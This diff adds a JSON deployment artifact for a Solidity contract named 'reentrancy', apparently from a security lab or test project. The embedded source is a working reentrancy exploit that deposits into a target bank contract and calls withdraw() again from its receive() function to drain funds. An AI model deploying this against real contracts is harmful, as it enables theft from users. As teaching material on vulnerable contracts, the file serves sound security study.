@@ -1,0 +1,237 @@
+{
+  "address": "0x4Ef20F5CA51632Ef44609E58Fc327857fEDF1e05",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_target",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        {
+          "indexed": false,
+          "internalType": "uint256",
+          "name": "finalBalance",
+          "type": "uint256"
+        }
+      ],
+      "name": "AttackFinished",
+      "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        {
+          "indexed": false,
+          "internalType": "uint256",
+          "name": "amount",
+          "type": "uint256"
+        }
+      ],
+      "name": "AttackStarted",
+      "type": "event"
+    },
+    {
+      "anonymous": false,
+      "inputs": [
+        {
+          "indexed": false,
+          "internalType": "uint256",
+          "name": "count",
+          "type": "uint256"
+        },
+        {
+          "indexed": false,
+          "internalType": "uint256",
+          "name": "contractBalance",
+          "type": "uint256"
+        }
+      ],
+      "name": "Reentered",
+      "type": "event"
+    },
+    {
+      "inputs": [],
+      "name": "attackInProgress",
+      "outputs": [
+        {
+          "internalType": "bool",
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "getBalance",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "maxReentries",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "reentryCount",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "uint256",
+          "name": "_max",
+          "type": "uint256"
+        }
+      ],
+      "name": "setMaxReentries",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "simulateAttack",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "contract IBank",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0x2ece530da83477a5dab5a4535df9f8dc12ca60ac63e990b6ae47c5191cf94062",
+  "receipt": {
+    "to": null,
+    "from": "0x96E7Ebadb27e04C2425a4f9BAFFf9F38295383b7",
+    "contractAddress": "0x4Ef20F5CA51632Ef44609E58Fc327857fEDF1e05",
+    "transactionIndex": 0,
+    "gasUsed": "329310",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x43ebc0ab82560ac666d971c5d609217571f75ff56f96eb7ced07e6ccdf91aa68",
+    "transactionHash": "0x2ece530da83477a5dab5a4535df9f8dc12ca60ac63e990b6ae47c5191cf94062",
+    "logs": [],
+    "blockNumber": 96177461,
+    "cumulativeGasUsed": "329310",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x6896ECEa85319f79f93c1Ec7Cc1cCA4847fecc28"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "90dd190cd0ac1cdf0f3c567125001b91",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"finalBalance\",\"type\":\"uint256\"}],\"name\":\"AttackFinished\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"AttackStarted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"count\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"contractBalance\",\"type\":\"uint256\"}],\"name\":\"Reentered\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"attackInProgress\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReentries\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"reentryCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_max\",\"type\":\"uint256\"}],\"name\":\"setMaxReentries\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"simulateAttack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IBank\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/attacks/reentrancy.sol\":\"reentrancy\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/attacks/reentrancy.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ninterface IBank {\\n    function deposit() external payable;\\n    function withdraw() external;\\n}\\n\\ncontract reentrancy{\\n    IBank public target;\\n\\n    uint256 public reentryCount;\\n    uint256 public maxReentries = 10;\\n    bool public attackInProgress;\\n\\n    event AttackStarted(uint256 amount);\\n    event Reentered(uint256 count, uint256 contractBalance);\\n    event AttackFinished(uint256 finalBalance);\\n\\n    constructor(address _target) {\\n        target = IBank(_target);\\n    }\\n\\n    function setMaxReentries(uint256 _max) external {\\n        maxReentries = _max;\\n    }\\n\\n    function simulateAttack() external payable {\\n        require(msg.value > 0, \\\"Send ETH\\\");\\n\\n        attackInProgress = true;\\n        emit AttackStarted(msg.value);\\n\\n        target.deposit{value: msg.value}();\\n        target.withdraw();\\n\\n        attackInProgress = false;\\n\\n        emit AttackFinished(address(this).balance);\\n    }\\n\\n    receive() external payable {\\n        if (attackInProgress && reentryCount < maxReentries) {\\n            reentryCount++;\\n            emit Reentered(reentryCount, address(target).balance);\\n            target.withdraw();\\n        }\\n    }\\n\\n    function getBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\",\"keccak256\":\"0xc29076b18d10a091cdb6a8d6799922a867847bbdde7071900b0831cd4022a3e6\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x6080604052600a600255348015601457600080fd5b506040516104b83803806104b88339810160408190526031916055565b600080546001600160a01b0319166001600160a01b03929092169190911790556083565b600060208284031215606657600080fd5b81516001600160a01b0381168114607c57600080fd5b9392505050565b610426806100926000396000f3fe6080604052600436106100745760003560e01c8063818c8c7c1161004e578063818c8c7c146101a0578063ab50099d146101ca578063d2cacac2146101ea578063d4b83992146101f257600080fd5b806312065fe014610152578063352bb4ba1461017457806353b381691461018a57600080fd5b3661014d5760035460ff16801561008e5750600254600154105b1561014b57600180549060006100a3836103b0565b9091555050600154600054604080519283526001600160a01b039091163160208301527f0b8e59e64518371a96f6e471520e4353d76709453d198e87a22fef9f6e0a2d3f910160405180910390a16000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561013257600080fd5b505af1158015610146573d6000803e3d6000fd5b505050505b005b600080fd5b34801561015e57600080fd5b50475b6040519081526020015b60405180910390f35b34801561018057600080fd5b5061016160025481565b34801561019657600080fd5b5061016160015481565b3480156101ac57600080fd5b506003546101ba9060ff1681565b604051901515815260200161016b565b3480156101d657600080fd5b5061014b6101e53660046103d7565b600255565b61014b61022a565b3480156101fe57600080fd5b50600054610212906001600160a01b031681565b6040516001600160a01b03909116815260200161016b565b600034116102695760405162461bcd60e51b81526020600482015260086024820152670a6cadcc8408aa8960c31b604482015260640160405180910390fd5b6003805460ff191660011790556040517f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a906102a89034815260200190565b60405180910390a160008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102fe57600080fd5b505af1158015610312573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b15801561035957600080fd5b505af115801561036d573d6000803e3d6000fd5b50506003805460ff1916905550506040514781527f45776e8c4137c2d25b59c6bc4e32fd07c3789be92c2623f548bdcc1c513ffad69060200160405180910390a1565b6000600182016103d057634e487b7160e01b600052601160045260246000fd5b5060010190565b6000602082840312156103e957600080fd5b503591905056fea2646970667358221220a1a5b022d56c99f9785859a759b8ca3968197b229fc62dcc18ff7faabfb840c464736f6c634300081e0033",
+  "deployedBytecode": "0x6080604052600436106100745760003560e01c8063818c8c7c1161004e578063818c8c7c146101a0578063ab50099d146101ca578063d2cacac2146101ea578063d4b83992146101f257600080fd5b806312065fe014610152578063352bb4ba1461017457806353b381691461018a57600080fd5b3661014d5760035460ff16801561008e5750600254600154105b1561014b57600180549060006100a3836103b0565b9091555050600154600054604080519283526001600160a01b039091163160208301527f0b8e59e64518371a96f6e471520e4353d76709453d198e87a22fef9f6e0a2d3f910160405180910390a16000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561013257600080fd5b505af1158015610146573d6000803e3d6000fd5b505050505b005b600080fd5b34801561015e57600080fd5b50475b6040519081526020015b60405180910390f35b34801561018057600080fd5b5061016160025481565b34801561019657600080fd5b5061016160015481565b3480156101ac57600080fd5b506003546101ba9060ff1681565b604051901515815260200161016b565b3480156101d657600080fd5b5061014b6101e53660046103d7565b600255565b61014b61022a565b3480156101fe57600080fd5b50600054610212906001600160a01b031681565b6040516001600160a01b03909116815260200161016b565b600034116102695760405162461bcd60e51b81526020600482015260086024820152670a6cadcc8408aa8960c31b604482015260640160405180910390fd5b6003805460ff191660011790556040517f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a906102a89034815260200190565b60405180910390a160008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102fe57600080fd5b505af1158015610312573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b15801561035957600080fd5b505af115801561036d573d6000803e3d6000fd5b50506003805460ff1916905550506040514781527f45776e8c4137c2d25b59c6bc4e32fd07c3789be92c2623f548bdcc1c513ffad69060200160405180910390a1565b6000600182016103d057634e487b7160e01b600052601160045260246000fd5b5060010190565b6000602082840312156103e957600080fd5b503591905056fea2646970667358221220a1a5b022d56c99f9785859a759b8ca3968197b229fc62dcc18ff7faabfb840c464736f6c634300081e0033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 11,
+        "contract": "contracts/attacks/reentrancy.sol:reentrancy",
+        "label": "target",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_contract(IBank)8"
+      },
+      {
+        "astId": 13,
+        "contract": "contracts/attacks/reentrancy.sol:reentrancy",
+        "label": "reentryCount",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 16,
+        "contract": "contracts/attacks/reentrancy.sol:reentrancy",
+        "label": "maxReentries",
+        "offset": 0,
+        "slot": "2",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 18,
+        "contract": "contracts/attacks/reentrancy.sol:reentrancy",
+        "label": "attackInProgress",
+        "offset": 0,
+        "slot": "3",
+        "type": "t_bool"
+      }
+    ],
+    "types": {
+      "t_bool": {
+        "encoding": "inplace",
+        "label": "bool",
+        "numberOfBytes": "1"
+      },
+      "t_contract(IBank)8": {
+        "encoding": "inplace",
+        "label": "contract IBank",
+        "numberOfBytes": "20"
+      },
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
